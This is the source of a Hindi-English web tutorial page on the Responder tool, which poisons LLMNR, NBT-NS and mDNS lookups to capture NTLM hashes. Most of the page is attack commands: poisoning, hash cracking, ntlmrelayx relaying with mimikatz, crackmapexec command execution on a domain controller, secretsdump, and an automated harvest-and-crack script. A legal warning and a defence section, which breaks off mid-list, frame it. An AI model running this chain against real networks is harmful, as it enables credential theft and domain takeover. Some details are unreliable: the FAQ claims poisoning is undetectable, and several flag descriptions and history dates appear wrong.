import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Responder() {
  return (
    <TutorialLayout
      title="responder"
      subtitle="LLMNR/NBT-NS/MDNS poisoning और credential capture टूल"
      icon="🎯"
      prev={{ to: '/tool/setoolkit', label: 'setoolkit' }}
      next={{ to: '/tool/bloodhound', label: 'bloodhound' }}
    >
      <h2>What is Responder?</h2>
      <p>
        Responder एक शक्तिशाली LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), और MDNS (Multicast DNS) poisoning टूल है जो local network पर credential hashes capture करता है। यह टूल Windows domain environments में authentication requests को intercept करके NTLMv1/v2 hashes extract करता है। Responder penetration testers और red teamers के लिए एक essential टूल है जो internal network assessment में इस्तेमाल होता है।
      </p>
      <p>
        Responder को Laurent Gaffie (SpiderLabs) ने 2013 में बनाया था। यह Python में लिखा गया है और Windows networks में name resolution protocols की कमज़ोरियों का फ़ायदा उठाता है। जब कोई Windows machine network resource access करने की कोशिश करता है, तो वह पहले LLMNR और NBT-NS से name resolution करता है। Responder इन queries को intercept करके अपने आप को authentic server के रूप में present करता है।
      </p>
      <p>
        Responder की सबसे बड़ी खासियत यह है कि यह completely passive तरीके से काम कर सकता है — सिर्फ listen करके भी credentials capture कर सकता है। लेकिन active poisoning mode में यह ज़्यादा effective है। यह Windows domain environments में सबसे ज़्यादा काम आता है जहाँ LLMNR और NBT-NS default enabled होते हैं।
      </p>
      <p>
        Responder का इस्तेमाल mainly two purposes के लिए होता है — credential harvesting और network reconnaissance। Credential harvesting में NTLMv1/v2 hashes capture करके offline crack किया जाता है या relay attack में इस्तेमाल किया जाता है। Network reconnaissance में यह network पर active machines, domain controllers, और file servers को identify करता है।
      </p>
      <p>
        Responder को Kali Linux और Kali Nethunter में pre-installed किया जाता है। यह टूल open source है और GitHub पर available है। इसका latest version Responder 3 है जिसमें कई improvements किए गए हैं — better IPv6 support, improved logging, और नए protocol handlers।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Responder केवल अधिकृत penetration testing और red team operations में ही इस्तेमाल करें। बिना अनुमति के network poisoning और credential capture illegal है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized network interception अपराध हो सकता है।
      </div>

      <h2>History of Responder</h2>
      <p>
        Responder की शुरुआत 2013 में Laurent Gaffie (SpiderLabs/Trustwave) ने की थी। Laurent ने Windows name resolution protocols की कमज़ोरियों को पहचाना और एक टूल बनाया जो इन vulnerabilities को exploit कर सके। पहला version सिर्फ LLMNR और NBT-NS poisoning support करता था।
      </p>
      <p>
        2014 में Responder v2 आया जिसमें MDNS support, WPAD exploitation, और बेहतर hash capture functionality जोड़ी गई। 2016 में SpiderLabs ने Responder को open source कर दिया और community ने इसे और improve किया। 2019 में Responder v3 आया जिसमें IPv6 support, fingerprinting, और analyze mode जोड़ा गया।
      </p>
      <p>
        Responder का development interesting रहा है। Laurent Gaffie ने originally इसे internal tool के रूप में बनाया था जो SpiderLabs के penetration testing engagements में इस्तेमाल होता था। जब community को इसके बारे में पता चला, तो demand इतनी बढ़ गई कि open source release करना पड़ा। आज Responder GitHub पर 3000+ stars के साथ सबसे popular internal pentesting tools में से एक है।
      </p>
      <p>
        Responder v3 में कई major improvements हैं — नया fingerprinting engine जो connected clients का OS और version detect करता है, better IPv6 support जो DHCPv6 attacks को और effective बनाता है, improved logging जो post-engagement analysis को आसान बनाता है, और multicast DNS support जो modern environments में भी काम करता है। 2023 में Responder में Kali Linux tools repository integration add हुआ जिससे installation और update बहुत आसान हो गया।
      </p>
      <p>
        Responder ने internal penetration testing को पूरी तरह बदल दिया। पहले जो काम manual enumeration में घंटों लगते थे, Responder से minutes में हो जाते हैं। यह टूल HackTheBox, TryHackMe, और OSCP labs में बहुत commonly इस्तेमाल होता है।
      </p>

      <h2>How Responder Works?</h2>
      <p>
        Responder multiple name resolution protocols का फ़ायदा उठाकर credential hashes capture करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">LLMNR Poisoning:</strong> Link-Local Multicast Name Resolution queries को intercept करता है। जब Windows machine किसी hostname को resolve नहीं कर पाता, तो LLMNR broadcast करता है</li>
        <li><strong className="text-white">NBT-NS Poisoning:</strong> NetBIOS Name Service queries को intercept करता है। यह LLMNR से पुराना protocol है लेकिन Windows में अभी भी enabled है</li>
        <li><strong className="text-white">MDNS Poisoning:</strong> Multicast DNS queries को handle करता है। यह mDNS (port 5353) पर काम करता है</li>
        <li><strong className="text-white">DHCP Poisoning:</strong> DHCPv6 queries को intercept करके DNS server redirect करता है</li>
        <li><strong className="text-white">WPAD Exploitation:</strong> Web Proxy Auto-Discovery protocol को exploit करता है</li>
        <li><strong className="text-white">HTTP/HTTPS Server:</strong> Rogue HTTP/HTTPS server चलाकर authentication requests capture करता है</li>
        <li><strong className="text-white">SMB Server:</strong> Rogue SMB server चलाकर NTLM authentication capture करता है</li>
        <li><strong className="text-white">LDAP Server:</strong> Rogue LDAP server चलाकर authentication capture करता है</li>
        <li><strong className="text-white">SQL Server:</strong> Rogue MSSQL server चलाकर authentication capture करता है</li>
        <li><strong className="text-white">Fingerprinting:</strong> Connected clients को fingerprint करके OS और version detect करता है</li>
      </ul>
      <p>
        Responder का attack flow simple है: पहले network पर LLMNR/NBT-NS broadcast queries listen करता है। जब कोई Windows machine किसी hostname (जैसे "fileserver") को resolve नहीं कर पाता, तो LLMNR broadcast query भेजता है। Responder इस query का response देता है और अपने आप को authentic server बताता है। Victim machine Responder से authenticate करती है और NTLMv1/v2 hash send करती है।
      </p>
      <p>
        Responder दो modes में काम करता है — Analyze mode (passive, सिर्फ listen) और Active mode (poisoning + capture)। Analyze mode (-A flag) सबसे safe है और detection risk minimal है। Active mode में Responder rogue servers चलाता है जो real servers से compete करते हैं। यह detectable है लेकिन ज़्यादा effective भी है।
      </p>

      <h2>Installation</h2>
      <CodeBlock
        title="Responder Installation"
        code={`# Kali Linux/Nethunter में pre-installed:
sudo apt update
sudo apt install responder

# Git से latest version:
git clone https://github.com/lgandx/Responder.git
cd Responder
pip3 install -r requirements.txt

# Verify installation:
responder --version
responder --help

# Config file location:
cat /etc/responder/Responder.conf`}
      />
      <CodeBlock
        title="Installation on Different Platforms"
        code={`# Ubuntu/Debian:
sudo apt install responder

# Arch Linux:
sudo pacman -S responder

# macOS (pip):
pip3 install Responder

# Windows — recommend नहीं किया जाता, Inveigh use करो:
# PowerShell Install-Module -Name Inveigh

# Termux (Android):
pkg install python
pip install Responder
# Root access ज़रूरी है (rooted phone)

# Docker से:
docker run --net=host -it ghcr.io/lgandx/responder -I eth0

# Virtual environment में:
python3 -m venv responder-env
source responder-env/bin/activate
pip install Responder`}
      />

      <h2>Basic Usage</h2>
      <CodeBlock
        title="Basic Responder Commands"
        code={`# Simple run (default settings):
sudo responder -I eth0

# Verbose mode:
sudo responder -I eth0 -v

# Analyze mode (सिर्फ listen, no poisoning):
sudo responder -I eth0 -A

# Poisoning + fingerprinting:
sudo responder -I eth0 -f

# With DHCPv6 poisoning:
sudo responder -I eth0 -D

# Disable specific servers:
sudo responder -I eth0 --disable http
sudo responder -I eth0 --disable smb

# With WPAD:
sudo responder -I eth0 -w

# With DHCPv6 + WPAD:
sudo responder -I eth0 -D -w`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-I</td><td className="py-2 px-3">Network interface specify करें</td><td className="py-2 px-3 font-mono text-xs">-I eth0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-A</td><td className="py-2 px-3">Analyze mode — सिर्फ listen करें</td><td className="py-2 px-3 font-mono text-xs">-A</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">Verbose output</td><td className="py-2 px-3 font-mono text-xs">-v</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-w</td><td className="py-2 px-3">WPAD proxy support enable</td><td className="py-2 px-3 font-mono text-xs">-w</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-D</td><td className="py-2 px-3">DHCPv6 DNS poisoning</td><td className="py-2 px-3 font-mono text-xs">-D</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-f</td><td className="py-2 px-3">Fingerprinting enable</td><td className="py-2 px-3 font-mono text-xs">-f</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d</td><td className="py-2 px-3">DHCPv6 domain</td><td className="py-2 px-3 font-mono text-xs">-d domain.local</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--disable</td><td className="py-2 px-3">Specific server disable करें</td><td className="py-2 px-3 font-mono text-xs">--disable http</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--enable</td><td className="py-2 px-3">Specific server enable करें</td><td className="py-2 px-3 font-mono text-xs">--enable smb</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c</td><td className="py-2 px-3">Custom config file</td><td className="py-2 px-3 font-mono text-xs">-c /path/to.conf</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-b</td><td className="py-2 px-3">NTLMv1/v2 hash capture</td><td className="py-2 px-3 font-mono text-xs">-b</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-L</td><td className="py-2 px-3">LM hash force करें</td><td className="py-2 px-3 font-mono text-xs">-L</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-r</td><td className="py-2 px-3">NetBIOS domain name</td><td className="py-2 px-3 font-mono text-xs">-r</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-P</td><td className="py-2 px-3">NTLM proxy auth capture</td><td className="py-2 px-3 font-mono text-xs">-P</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--lm</td><td className="py-2 px-3">LM hash force (legacy)</td><td className="py-2 px-3 font-mono text-xs">--lm</td></tr>
          </tbody>
        </table>
      </div>

      <h2>LLMNR Poisoning</h2>
      <p>
        LLMNR poisoning Responder का primary attack vector है। जब Windows machine किसी hostname को resolve नहीं कर पाता (DNS fail होने पर), तो LLMNR broadcast करता है। Responder इस broadcast को capture करके respond करता है।
      </p>
      <CodeBlock
        title="LLMNR Poisoning Attack"
        code={`# LLMNR poisoning start करें:
sudo responder -I eth0 -v

# जब कोई machine fileshare access करे:
# \\fileserver\share type करे (जो exist नहीं करता)

# Responder intercept करेगा:
# [LLMNR] Poisoned answer sent to 192.168.1.50
# for name FILESERVER

# अब victim आपके machine से authenticate करेगा:
# [SMB] NTLMv2-SSP Client : 192.168.1.50
# [SMB] NTLMv2-SSP Username : CORP\Administrator
# [SMB] NTLMv2-SSP Hash : Administrator::CORP:...

# Hash capture हो गया! अब crack करो:
hashcat -m 5600 hash.txt rockyou.txt
# या relay attack करो (Responder + ntlmrelayx)`}
      />

      <h2>NBT-NS Poisoning</h2>
      <p>
        NBT-NS (NetBIOS Name Service) LLMNR से पुराना protocol है लेकिन Windows में अभी भी enabled है। यह port 137 (UDP) पर काम करता है।
      </p>
      <CodeBlock
        title="NBT-NS Poisoning"
        code={`# NBT-NS automatically poisoned होता है:
sudo responder -I eth0 -v

# Responder output:
# [NBT-NS] Poisoned answer sent to 192.168.1.50

# जब victim NetBIOS name resolve करे:
# Responder respond करेगा और authentication request आएगा

# Config file में NBT-NS enable/disable:
# Responder.conf:
# RespondTo = NBT-NS`}
      />

      <h2>Credential Hash Capture</h2>
      <p>
        Responder NTLMv1 और NTLMv2 hashes capture करता है। इन hashes को offline crack करके password निकाल सकते हो।
      </p>
      <CodeBlock
        title="Hash Capture और Cracking"
        code={`# Responder run करें:
sudo responder -I eth0 -v

# Capture output example:
# [SMB] NTLMv2-SSP Client   : 192.168.1.50
# [SMB] NTLMv2-SSP Username : CORP\Administrator
# [SMB] NTLMv2-SSP Hash     : Administrator::CORP:1122334455667788:AABB...

# Hash file location:
# /usr/share/responder/logs/

# Hashcat से crack करें:
# NTLMv2 (mode 5600):
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# NTLMv1 (mode 5500):
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

# John the Ripper से:
john --format=netntlmv2 hash.txt --wordlist=rockyou.txt`}
      />

      <h2>WPAD Exploitation</h2>
      <p>
        WPAD (Web Proxy Auto-Discovery) exploitation से victim की browser traffic को capture कर सकते हो।
      </p>
      <CodeBlock
        title="WPAD Attack"
        code={`# WPAD exploitation enable करें:
sudo responder -I eth0 -w -v

# यह WPAD proxy server host करता है:
# [WPAD] Poisoned answer sent to 192.168.1.50

# जब victim browser open करे:
# Browser WPAD server से proxy config download करेगा
# और आपके proxy से authenticate करेगा

# NTLM proxy authentication capture:
# [HTTP] NTLMv2 Username : CORP\Administrator
# [HTTP] NTLMv2 Hash     : Administrator::CORP:...

# WPAD + DHCPv6 combo:
sudo responder -I eth0 -w -D -v`}
      />

      <h2>Analyze Mode</h2>
      <p>
        Analyze mode में Responder सिर्फ listen करता है — कोई poisoning नहीं करता। यह network reconnaissance के लिए useful है।
      </p>
      <CodeBlock
        title="Analyze Mode"
        code={`# Analyze mode (passive listening):
sudo responder -I eth0 -A -v

# यह दिखाएगा:
# [LLMNR] Request from 192.168.1.50 for FILESERVER
# [NBT-NS] Request from 192.168.1.50 for FILESERVER
# [MDNS] Request from 192.168.1.50 for fileserver.local

# Useful for:
# - Network mapping
# - Active hosts discover करना
# - Domain controllers identify करना
# - File servers find करना
# - Network topology समझना`}
      />

      <h2>Protocols Poisoned</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Protocol</th>
              <th className="text-left py-2 px-3 text-neon-green">Port</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">Default</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">LLMNR</td><td className="py-2 px-3">5355/UDP</td><td className="py-2 px-3">Name resolution poisoning</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">NBT-NS</td><td className="py-2 px-3">137/UDP</td><td className="py-2 px-3">NetBIOS name poisoning</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MDNS</td><td className="py-2 px-3">5353/UDP</td><td className="py-2 px-3">mDNS poisoning</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DHCPv6</td><td className="py-2 px-3">547/UDP</td><td className="py-2 px-3">IPv6 DNS redirect</td><td className="py-2 px-3">OFF</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">HTTP</td><td className="py-2 px-3">80/TCP</td><td className="py-2 px-3">Rogue HTTP server</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">HTTPS</td><td className="py-2 px-3">443/TCP</td><td className="py-2 px-3">Rogue HTTPS server</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SMB</td><td className="py-2 px-3">445/TCP</td><td className="py-2 px-3">Rogue SMB server</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">LDAP</td><td className="py-2 px-3">389/TCP</td><td className="py-2 px-3">Rogue LDAP server</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MSSQL</td><td className="py-2 px-3">1433/TCP</td><td className="py-2 px-3">Rogue SQL server</td><td className="py-2 px-3">ON</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">FTP</td><td className="py-2 px-3">21/TCP</td><td className="py-2 px-3">Rogue FTP server</td><td className="py-2 px-3">ON</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">POP3</td><td className="py-2 px-3">110/TCP</td><td className="py-2 px-3">Rogue POP3 server</td><td className="py-2 px-3">ON</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Pentesting Workflow</h2>
      <CodeBlock
        title="Complete Attack Chain"
        code={`# Step 1: Network reconnaissance
sudo responder -I eth0 -A -v
# Active hosts और servers identify करें

# Step 2: Credential harvesting
sudo responder -I eth0 -v
# NTLMv2 hashes capture करें

# Step 3: Hash cracking
hashcat -m 5600 hash.txt rockyou.txt
# Passwords crack करें

# Step 4: Relay attack (alternative)
# Responder + ntlmrelayx combination:
sudo responder -I eth0 --disable http,smb
# एक साथ दूसरे terminal में:
ntlmrelayx.py -tf targets.txt -smb2support

# Step 5: Lateral movement
crackmapexec smb 192.168.1.0/24 -u Administrator -p cracked_password

# Step 6: Credential dumping
secretsdump.py CORP/Administrator@192.168.1.50`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated Credential Harvesting"
        code={`#!/bin/bash
# Responder + Hashcat automated script

INTERFACE=$1
DURATION=$2  # minutes

echo "[*] Starting Responder on $INTERFACE..."
sudo timeout $((DURATION * 60)) responder -I $INTERFACE -v -w -D &
RESPONDER_PID=$!

echo "[*] Responder running for $DURATION minutes..."
sleep $((DURATION * 60))

echo "[*] Checking captured hashes..."
HASH_DIR="/usr/share/responder/logs/"
HASH_COUNT=$(find "$HASH_DIR" -name "*.txt" -type f | wc -l)
echo "[+] Captured $HASH_COUNT hash files"

for hash_file in "$HASH_DIR"/*.txt; do
    if [ -f "$hash_file" ]; then
        echo "[*] Cracking: $hash_file"
        hashcat -m 5600 "$hash_file" /usr/share/wordlists/rockyou.txt \
            --force -o cracked.txt 2>/dev/null
    fi
done

echo "[+] Done! Check cracked.txt for results"`}
      />

      <CodeBlock
        title="Network Monitoring Script"
        code={`#!/bin/bash
# Responder network monitoring

INTERFACE=$1
LOG_FILE="responder_$(date +%Y%m%d_%H%M%S).log"

echo "[*] Starting network monitoring on $INTERFACE"
echo "[*] Log file: $LOG_FILE"

# Analyze mode से passive monitoring:
sudo responder -I $INTERFACE -A -v 2>&1 | tee "$LOG_FILE"

# Active hosts count करें:
echo ""
echo "[*] Active hosts found:"
grep "Answer sent" "$LOG_FILE" | awk '{print $5}' | sort -u

echo "[*] Unique users detected:"
grep "Username" "$LOG_FILE" | awk '{print $4}' | sort -u`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Responder internal penetration tests में सबसे commonly इस्तेमाल होने वाला टूल है। जब भी किसी Windows domain environment में access मिलता है, Responder पहले चलाया जाता है।
      </p>
      <p>
        एक typical scenario: tester को office network में WiFi access मिलता है। Responder wlan0 interface पर चलाता है। कुछ ही मिनटों में, कोई employee file share access करने की कोशिश करता है और LLMNR broadcast होता है। Responder intercept करके NTLMv2 hash capture करता है। Hash crack होने पर tester को domain user credentials मिल जाते हैं।
      </p>
      <p>
        एक और common scenario: corporate network में Responder + ntlmrelayx combination। Responder SMB/HTTP disable करके सिर्फ poisoning करता है, और ntlmrelayx captured hashes को relay करके directly authenticate करता है। इसमें password crack करने की ज़रूरत नहीं होती — hash directly काम करता है।
      </p>
      <CodeBlock
        title="Corporate Network Attack Scenario"
        code={`# WiFi access मिला — wlan0 interface पर:
sudo responder -I wlan0 -v -w -D

# कुछ मिनट wait करो — hashes आने लगेंगे:
# [LLMNR] Poisoned answer sent to 192.168.1.50
# [SMB] NTLMv2-SSP Hash : Administrator::CORP:...

# Hash crack करो:
hashcat -m 5600 hash.txt rockyou.txt -r rules/best64.rule

# Password मिल गया — अब lateral movement:
crackmapexec smb 192.168.1.0/24 -u Administrator -p cracked_pass

# Domain controller पर access:
crackmapexec smb 192.168.1.1 -u Administrator -p cracked_pass -x "whoami"`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        Responder अकेले limited है, लेकिन दूसरे tools के साथ मिलकर powerful attack chain बनता है। सबसे common combination Responder + ntlmrelayx है।
      </p>
      <CodeBlock
        title="Responder + ntlmrelayx"
        code={`# Responder + ntlmrelayx — सबसे powerful combo:
# Terminal 1: Responder (सिर्फ poisoning, SMB/HTTP off):
sudo responder -I eth0 --disable smb,http,ldap -v

# Terminal 2: ntlmrelayx (relay targets):
ntlmrelayx.py -tf targets.txt -smb2support

# targets.txt में DC IP addresses:
# 192.168.1.1 (DC01)
# 192.168.1.2 (DC02)

# जब hash capture होता है, ntlmrelayx automatically relay करता है:
# [*] SMBD-Thread-5: Received connection from 192.168.1.50
# [*] Authenticating against 192.168.1.1 as CORP/Administrator
# [+] Target authentication successful!

# ntlmrelayx + Mimikatz:
ntlmrelayx.py -tf targets.txt -smb2support -e mimikatz.exe

# ntlmrelayx + SOCKS proxy:
ntlmrelayx.py -tf targets.txt -smb2support -socks
# अब proxychains से relay session use करो`}
      />
      <CodeBlock
        title="Responder + CrackMapExec + BloodHound"
        code={`# Full attack chain:
# Step 1: Responder से hashes capture करो
sudo responder -I eth0 -v

# Step 2: Hash crack करो
hashcat -m 5600 hash.txt rockyou.txt

# Step 3: CrackMapExec से enumerate करो
crackmapexec smb 192.168.1.0/24 -u user -p password --shares
crackmapexec smb 192.168.1.0/24 -u user -p password --users
crackmapexec smb 192.168.1.0/24 -u user -p password --groups

# Step 4: BloodHound data collect करो
bloodhound-python -d corp.local -u user -p password -c All -ns 192.168.1.1

# Step 5: BloodHound में attack path ढूंढो
# "Find Shortest Paths to Domain Admin" query चलाओ

# Step 6: Lateral movement
crackmapexec smb 192.168.1.0/24 -u Administrator -p password -x "command"`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Responder को optimize करने से ज़्यादा hashes capture होते हैं और detection risk कम होता है।
      </p>
      <CodeBlock
        title="Responder Optimization"
        code={`# Interface selection — सही interface choose करो:
# WiFi networks के लिए:
sudo responder -I wlan0 -v

# Wired networks के लिए:
sudo responder -I eth0 -v

# Multiple interfaces:
sudo responder -I eth0 -I wlan0 -v

# Responder.conf optimize करो:
# RespondTo = LLMNR,NBT-NS,MDNS (सब enable रखो)
# Serve-Html = Off (अगर WPAD नहीं चाहिए)
# HTTP = Off, SMB = Off (relay mode में)

# Log rotation — बड़े networks में logs बड़े होते हैं:
# /usr/share/responder/logs/ directory monitor करो
# पुराने logs archive करो

# Resource usage — Responder lightweight है:
# CPU: minimal
# Memory: ~50MB
# Network: depends on broadcast traffic`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Responder logs valuable data देते हैं जिन्हें analyze करके network security posture समझ सकते हो।
      </p>
      <CodeBlock
        title="Log Analysis"
        code={`# Responder log directory:
ls /usr/share/responder/logs/

# सभी captured hashes:
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt

# Hashes को Hashcat format में extract करो:
grep "NTLMv2" /usr/share/responder/logs/*.txt > all_hashes.txt

# Unique users find करो:
grep "Username" /usr/share/responder/logs/*.txt | awk '{print $4}' | sort -u

# Active hosts list करो:
grep "Answer sent" /usr/share/responder/logs/*.txt | awk '{print $5}' | sort -u

# Domain controllers identify करो:
grep "DC" /usr/share/responder/logs/*.txt | sort -u

# Report generation script:
echo "=== Responder Analysis Report ===" > report.txt
echo "Date: $(date)" >> report.txt
echo "Total hashes captured: $(wc -l < all_hashes.txt)" >> report.txt
echo "Unique users: $(grep 'Username' logs/*.txt | awk '{print $4}' | sort -u | wc -l)" >> report.txt
echo "Active hosts: $(grep 'Answer sent' logs/*.txt | awk '{print $5}' | sort -u | wc -l)" >> report.txt`}
      />

      <h2>Responder vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Responder</th>
              <th className="text-left py-2 px-3 text-neon-green">Inveigh</th>
              <th className="text-left py-2 px-3 text-neon-green">ntlmrelayx</th>
              <th className="text-left py-2 px-3 text-neon-green">mitm6</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Platform</td><td className="py-2 px-3">Python (Cross)</td><td className="py-2 px-3">PowerShell/C#</td><td className="py-2 px-3">Python (Cross)</td><td className="py-2 px-3">Python (Cross)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">LLMNR/NBT-NS</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">DHCPv6</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WPAD</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Relay Support</td><td className="py-2 px-3">नहीं (external)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (primary)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">IPv6</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">हाँ (primary)</td></tr>
            <tr><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Easy</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'No hashes captured आ रहा है', a: 'Network पर कोई LLMNR/NBT-NS request नहीं आ रही। Target machines को fileshare access करना होगा। या DHCPv6 mode try करो: -D flag। या WPAD mode: -w flag।' },
          { q: 'Permission denied error', a: 'sudo से run करो — Responder root privileges चाहता है। Port 80, 443, 445 privileged ports हैं।' },
          { q: 'Interface not found', a: 'ifconfig या ip a से correct interface name check करो। WiFi: wlan0, Ethernet: eth0।' },
          { q: 'Hash cracking नहीं हो रही', a: 'Hash type check करो — NTLMv2 (mode 5600) vs NTLMv1 (mode 5500)। Rules apply करो: hashcat -m 5600 hash.txt rockyou.txt -r rules/best64.rule' },
          { q: 'Responder और ntlmrelayx साथ में कैसे चलाएं?', a: 'Responder में SMB/HTTP disable करो: --disable smb,http। दूसरे terminal में ntlmrelayx चलाओ।' },
          { q: 'Windows Defender block कर रहा है', a: 'Responder network-level attack है — target machine पर कुछ install नहीं होता। Network-level poisoning detect नहीं होती।' },
          { q: 'Corporate firewall block कर रहा है', a: 'Internal network पर LLMNR/NBT-NS normally allowed होते हैं। या DHCPv6 attack try करो जो IPv6 use करता है।' },
          { q: 'Multiple domains हैं network पर', a: 'Responder सभी domains के hashes capture करता है। Username में domain name show होता है: CORP\Administrator।' },
          { q: 'IPv6 networks पर काम करता है?', a: 'हाँ, -D flag से DHCPv6 poisoning enable करो। IPv6 DNS poisoning करके भी hashes capture कर सकते हो। mitm6 टूल भी IPv6 attack के लिए use होता है।' },
          { q: 'Responder logs कहाँ save होते हैं?', a: 'Default location: /usr/share/responder/logs/। इसमें captured hashes, analyze logs, और fingerprint data save होता है। -c flag से custom config file specify कर सकते हो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Responder attacks से कैसे बचें:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">LLMNR Disable करें:</strong> Group Policy से LLMNR disable करें: Computer Configuration → Administrative Templates → Network → DNS Client → Turn OFF Multicast Name Resolution → Enabled</li>
        <li><strong className="text-white">NBT-NS Disable करें:</strong> Network adapter settings में NetBIOS over TCP/IP disable करें। Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces → NetbiosOptions = 2</li>
        <li><strong className="text-white">WPAD Disable करें:</strong> Group Policy से WPAD disable करें। DNS में wpad entry create करें (127.0.0.1)</li>
        <li><strong className="text-white">Network Segmentation:</strong> VLANs use करें — broadcast traffic limit होगी</li>
        <li><strong className="text-white">DNS Configuration:</strong> Proper DNS configure करें ताकि LLMNR/NBT-NS की ज़रूरत न पड़े</li>
        <li><strong className="text-white">NTLMv1 Disable करें:</strong> NTLMv1 बहुत weak है — NTLMv2 enforce करें या Kerberos use करें</li>
        <li><strong className="text-white">SMB Signing:</strong> SMB signing enable करें — relay attacks prevent होंगे</li>
        <li><strong className="text-white">IDS/IPS:</strong> Network monitoring tools से LLMNR/NBT-NS poisoning detect करें</li>
        <li><strong className="text-white">Password Policy:</strong> Strong passwords enforce करें — captured hashes crack न हों</li>
